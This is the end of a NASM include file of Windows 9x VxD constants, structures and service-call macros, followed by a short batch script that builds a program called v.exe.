PAGEMARKDIRTY		EQU	80000000H

P_SIZE		EQU	1000H
P_PRESBIT	EQU	0
P_PRES		EQU	(1 << P_PRESBIT)
P_WRITEBIT	EQU	1
P_WRITE		EQU	(1 << P_WRITEBIT)
P_USERBIT	EQU	2
P_USER		EQU	(1 << P_USERBIT)
P_ACCBIT	EQU	5
P_ACC		EQU	(1 << P_ACCBIT)
P_DIRTYBIT	EQU	6
P_DIRTY		EQU	(1 << P_DIRTYBIT)
P_AVAIL		EQU	(P_PRES+P_WRITE+P_USER)
PG_VM		EQU	0
PG_SYS		EQU	1
PG_RESERVED1	EQU	2
PG_PRIVATE	EQU	3
PG_RESERVED2	EQU	4
PG_RELOCK	EQU	5
PG_INSTANCE	EQU	6
PG_HOOKED	EQU	7
PG_IGNORE	EQU	0FFFFFFFFH
D_PRES		EQU	080H
D_NOTPRES	EQU	0
D_DPL0		EQU	0
D_DPL1		EQU	020H
D_DPL2		EQU	040H
D_DPL3		EQU	060H
D_SEG		EQU	010H
D_CTRL		EQU	0
D_GRAN_BYTE	EQU	000H
D_GRAN_PAGE	EQU	080H
D_DEF16		EQU	000H
D_DEF32		EQU	040H
D_CODE		EQU	08H
D_DATA		EQU	0
D_X		EQU	0
D_RX		EQU	02H
D_C		EQU	04H
D_R		EQU	0
D_W		EQU	02H
D_ED		EQU	04H
D_ACCESSED	EQU	1
RW_DATA_TYPE	EQU	(D_PRES+D_SEG+D_DATA+D_W)
R_DATA_TYPE	EQU	(D_PRES+D_SEG+D_DATA+D_R)
CODE_TYPE	EQU	(D_PRES+D_SEG+D_CODE+D_RX)
D_PAGE32	EQU	(D_GRAN_PAGE+D_DEF32)
SELECTOR_MASK	EQU	0FFF8H
SEL_LOW_MASK	EQU	0F8H
TABLE_MASK	EQU	04H
RPL_MASK	EQU	03H
RPL_CLR	EQU	(~RPL_MASK)
IVT_ROM_DATA_SIZE	EQU	500H

LMEM_STRING	EQU	00010000H
LMEM_OEM2ANSI	EQU	00020000H
QAAFL_APPYAVAIL	EQU	00000001H
QAAFL_APPYNOW	EQU	00000002H
CAAFL_RING0	EQU	00000001H
CAAFL_TIMEOUT	EQU	00000002H

PAGEOUT_PRIVATE	EQU	00000001H
PAGEOUT_SHARED	EQU	00000002H
PAGEOUT_SYSTEM	EQU	00000004H
PAGEOUT_REGION	EQU	00000008H
PAGEOUT_ALL	EQU	(PAGEOUT_PRIVATE | PAGEOUT_SHARED | PAGEOUT_SYSTEM)

PG_UNCACHED			EQU	00000001H
PG_WRITECOMBINED		EQU	00000002H
FLUSHCACHES_NORMAL		EQU	00000000H
FLUSHCACHES_GET_CACHE_LINE_PTR	EQU	00000001H
FLUSHCACHES_GET_CACHE_SIZE_PTR	EQU	00000002H
FLUSHCACHES_TAKE_OVER		EQU	00000003H
FLUSHCACHES_FORCE_PAGES_OUT	EQU	00000004H
FLUSHCACHES_LOCK_LOCKABLE	EQU	00000005H
FLUSHCACHES_UNLOCK_LOCKABLE	EQU	00000006H

HEAPZEROINIT	EQU	00000001H
HEAPZEROREINIT	EQU	00000002H
HEAPNOCOPY	EQU	00000004H
HEAPALIGN_SHIFT	EQU	16
HEAPALIGN_MASK	EQU	000F0000H
HEAPALIGN_4	EQU	00000000H
HEAPALIGN_8	EQU	00000000H
HEAPALIGN_16	EQU	00000000H
HEAPALIGN_32	EQU	00010000H
HEAPALIGN_64	EQU	00020000H
HEAPALIGN_128	EQU	00030000H
HEAPALIGN_256	EQU	00040000H
HEAPALIGN_512	EQU	00050000H
HEAPALIGN_1K	EQU	00060000H
HEAPALIGN_2K	EQU	00070000H
HEAPALIGN_4K	EQU	00080000H
HEAPALIGN_8K	EQU	00090000H
HEAPALIGN_16K	EQU	000A0000H
HEAPALIGN_32K	EQU	000B0000H
HEAPALIGN_64K	EQU	000C0000H
HEAPALIGN_128K	EQU	000D0000H
HEAPTYPESHIFT	EQU	8
HEAPTYPEMASK	EQU	00000700H
HEAPLOCKEDHIGH	EQU	00000000H
HEAPLOCKEDIFDP	EQU	00000100H
HEAPSWAP	EQU	00000200H
HEAPINIT	EQU	00000400H
HEAPCLEAN	EQU	00000800H
HEAPCONTIG	EQU	00001000H
HEAPFORGET	EQU	00002000H
HEAPLOCKEDLOW	EQU	00000300H
HEAPSYSVM	EQU	00000500H
HEAPPREEMPT	EQU	00000600H

LF_ASYNC_BIT		EQU	0
LF_ASYNC		EQU	(1 << LF_ASYNC_BIT)
LF_USE_HEAP_BIT		EQU	1
LF_USE_HEAP		EQU	(1 << LF_USE_HEAP_BIT)
LF_ALLOC_ERROR_BIT	EQU	2
LF_ALLOC_ERROR		EQU	(1 << LF_ALLOC_ERROR_BIT)
LF_SWAP			EQU	(LF_USE_HEAP+(1 << 3))

ASSERT_RANGE_NULL_BAD		EQU	00000000H
ASSERT_RANGE_NULL_OK		EQU	00000001H
ASSERT_RANGE_IS_ASCIIZ		EQU	00000002H
ASSERT_RANGE_IS_NOT_ASCIIZ	EQU	00000000H
ASSERT_RANGE_NO_DEBUG		EQU	80000000H
ASSERT_RANGE_BITS		EQU	80000003H

VXDLDR_INIT_DEVICE		EQU	000000001H

VXDLDR_ERR_OUT_OF_MEMORY	EQU	1
VXDLDR_ERR_IN_DOS		EQU	2
VXDLDR_ERR_FILE_OPEN_ERROR	EQU	3
VXDLDR_ERR_FILE_READ		EQU	4
VXDLDR_ERR_DUPLICATE_DEVICE	EQU	5
VXDLDR_ERR_BAD_DEVICE_FILE	EQU	6
VXDLDR_ERR_DEVICE_REFUSED	EQU	7
VXDLDR_ERR_NO_SUCH_DEVICE	EQU	8
VXDLDR_ERR_DEVICE_UNLOADABLE	EQU	9
VXDLDR_ERR_ALLOC_V86_AREA	EQU	10
VXDLDR_ERR_BAD_API_FUNCTION	EQU	11
VXDLDR_ERR_MAX			EQU	11

VXDLDR_NOTIFY_OBJECTUNLOAD	EQU	0
VXDLDR_NOTIFY_OBJECTLOAD	EQU	1

VXDLDR_APIFUNC_GETVERSION   EQU 0
VXDLDR_APIFUNC_LOADDEVICE   EQU 1
VXDLDR_APIFUNC_UNLOADDEVICE EQU 2


struc DIOCParams
.Internal1		resd 1
.VMHandle		resd 1
.Internal2		resd 1
.dwIoControlCode	resd 1
.lpvInBuffer		resd 1
.cbInBuffer		resd 1
.lpvOutBuffer		resd 1
.cbOutBuffer		resd 1
.lpcbBytesReturned	resd 1
.lpoOverlapped		resd 1
.hDevice		resd 1
.tagProcess		resd 1
endstruc

VWIN32_DIOC_GETVERSION		EQU	DIOC_GETVERSION
VWIN32_DIOC_DOS_IOCTL		EQU	1
VWIN32_DIOC_DOS_INT25		EQU	2
VWIN32_DIOC_DOS_INT26		EQU	3
VWIN32_DIOC_DOS_INT13		EQU	4
VWIN32_DIOC_SIMCTRLC		EQU	5
VWIN32_DIOC_DOS_DRIVEINFO	EQU	6
VWIN32_DIOC_CLOSEHANDLE		EQU	DIOC_CLOSEHANDLE

struc DIOCRegs
.reg_EBX	resd 1
.reg_EDX	resd 1
.reg_ECX	resd 1
.reg_EAX	resd 1
.reg_EDI	resd 1
.reg_ESI	resd 1
.reg_Flags	resd 1
endstruc

%ifndef FILE_FLAG_OVERLAPPED
struc _OVERLAPPED
.O_Internal	resd 1
.O_InternalHigh	resd 1
.O_Offset	resd 1
.O_OffsetHigh	resd 1
.O_hEvent	resd 1
endstruc
%endif


R0_OPENCREATFILE		equ	0D500h	; Open/Create a file
R0_OPENCREAT_IN_CONTEXT		equ	0D501h	; Open/Create file in current context
R0_READFILE			equ	0D600h	; Read a file, no context
R0_WRITEFILE			equ	0D601h	; Write to a file, no context
R0_READFILE_IN_CONTEXT		equ	0D602h	; Read a file, in thread context
R0_WRITEFILE_IN_CONTEXT		equ	0D603h	; Write to a file, in thread context
R0_CLOSEFILE			equ	0D700h	; Close a file
R0_GETFILESIZE			equ	0D800h	; Get size of a file
R0_FINDFIRSTFILE		equ	04E00h	; Do a LFN FindFirst operation
R0_FINDNEXTFILE			equ	04F00h	; Do a LFN FindNext operation
R0_FINDCLOSEFILE		equ	0DC00h	; Do a LFN FindClose operation
R0_FILEATTRIBUTES		equ	04300h	; Get/Set Attributes of a file
R0_RENAMEFILE			equ	05600h	; Rename a file
R0_DELETEFILE			equ	04100h	; Delete a file
R0_LOCKFILE			equ	05C00h	; Lock/Unlock a region in a file
R0_GETDISKFREESPACE		equ	03600h	; Get disk free space
R0_READABSOLUTEDISK		equ	0DD00h	; Absolute disk read
R0_WRITEABSOLUTEDISK		equ	0DE00h	; Absolute disk write


%macro GetDeviceServiceOrdinal 2
  mov %1, @@%2
%endmacro

%macro VxDCall 1-*
  %rep %0 - 1
    %rotate -1
    push %1
  %endrep
  %rotate -1
  db 0xCD, 0x20
  dd @@%1
  %if %0 > 1
    lea esp, [esp + 4*(%0 - 1)]
  %endif
%endmacro

%define VxDcall VxDCall

%macro VMMCall 1-2+
  %if (@@%1 >> 16) <> VMM_Device_ID
    %error %1 is not a VMM Service
  %endif
  VxDcall %1, %2
%endmacro

%define VMMcall VMMCall

%macro VxDJmp 1
  db 0xCD, 0x20
  dd (@@%1 | 0x80000000)
%endmacro
%define VxDjmp VxDJmp

%macro VMMJmp 1
  %if (@@%1 >> 16) <> VMM_Device_ID
    %error %1 is not a VMM Service
  %endif
  VxDJmp %1
%endmacro

%define VMMjmp VMMJmp

struc VxD_Desc_Block
DDB_Next		resd 1
DDB_SDK_Version		resw 1;   DW  DDK_VERSION
DDB_Req_Device_Number	resw 1;   DW  UNDEFINED_DEVICE_ID
DDB_Dev_Major_Version	resb 1;   DB  0
DDB_Dev_Minor_Version	resb 1;   DB  0
DDB_Flags		resw 1;   DW  0
DDB_Name		resb 8;   DB  "        "
DDB_Init_Order		resd 1;   DD  UNDEFINED_INIT_ORDER
DDB_Control_Proc	resd 1;    DD  ?
DDB_V86_API_Proc	resd 1;    DD  0
DDB_PM_API_Proc		resd 1; DD  0
DDB_V86_API_CSIP	resd 1;    DD  0
DDB_PM_API_CSIP		resd 1; DD  0
DDB_Reference_Data	resd 1;  DD  ?
DDB_Service_Table_Ptr	resd 1;   DD  0
DDB_Service_Table_Size	resd 1;  DD  0
DDB_Win32_Service_Table	resd 1; DD  0
DDB_Prev		resd 1;    DD  'Prev'
DDB_Size		resd 1;    DD  SIZE(VxD_Desc_Block)
DDB_Reserved1		resd 1;   DD  'Rsv1'
DDB_Reserved2		resd 1;   DD  'Rsv2'
DDB_Reserved3		resd 1;   DD  'Rsv3'
endstruc

;
; Params 5-9 are optional, since most of the time they are generic
; params: devname, quoted devname, major, minor, devid, initorder, v86, pm, ref
; Control_Proc must be named devname_Control
;
%macro Declare_Virtual_Device 4-9 UNDEFINED_DEVICE_ID, UNDEFINED_INIT_ORDER, 0, 0, 0
global %1_DDB
%1_DDB:
istruc VxD_Desc_Block
	at DDB_Next,			dd 0
	at DDB_SDK_Version,		dw DDK_VERSION
	at DDB_Req_Device_Number,	dw %5
	at DDB_Dev_Major_Version,	db %3
	at DDB_Dev_Minor_Version,	db %4
	at DDB_Flags,			dw 0
%%start:
	at DDB_Name,			db %2
%%end:
	TIMES 8-(%%end-%%start)		db ' '

	at DDB_Init_Order,		dd %6
	at DDB_Control_Proc,		dd %1_Control
	at DDB_V86_API_Proc,		dd %7
	at DDB_PM_API_Proc,		dd %8
	at DDB_V86_API_CSIP,		dd 0
	at DDB_PM_API_CSIP,		dd 0
	at DDB_Reference_Data,		dd %9

%ifdef Create_Service_Table_%1
	at DDB_Service_Table_Ptr,	dd %1_Service_Table
	at DDB_Service_Table_Size,	dd Num_%1_Services
%else
	at DDB_Service_Table_Ptr,	dd 0
	at DDB_Service_Table_Size,	dd 0
%endif

	at DDB_Win32_Service_Table,	dd 0
	at DDB_Prev,			db 'verP'
	at DDB_Size,			dd VxD_Desc_Block_size
	at DDB_Reserved1,		db '1vsR'
	at DDB_Reserved2,		db '2vsR'
	at DDB_Reserved3,		db '3vsR'
iend
%endmacro


%macro Trace_Out 1
[segment _LDATA]
%%msg: db %1, 13, 10, 0
__SECT__
push	dword %%msg
VMMCall _Trace_Out_Service
%endmacro

%macro Trace_Outcc 2
j%-1	%%cont
Trace_Out %2
%%cont:
%endmacro

%macro Trace_OutE 1
Trace_Outcc e, %1
%endmacro
%define Trace_OutZ Trace_OutE

%macro Trace_OutNE 1
Trace_Outcc ne, %1
%endmacro
%define Trace_OutNZ Trace_OutNE

%macro Trace_OutC 1
Trace_Outcc c, %1
%endmacro

%macro Trace_OutNC 1
Trace_Outcc nc, %1
%endmacro


%endif
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[VXDN.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
@echo off
if exist v.exe del v.exe
if exist v.obj del v.obj
nasmw -f win32 v.asm
gorc /r vres.rc
alink -entry start -oPE v.obj vres.res kernel32.lib user32.lib gdi32.lib
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
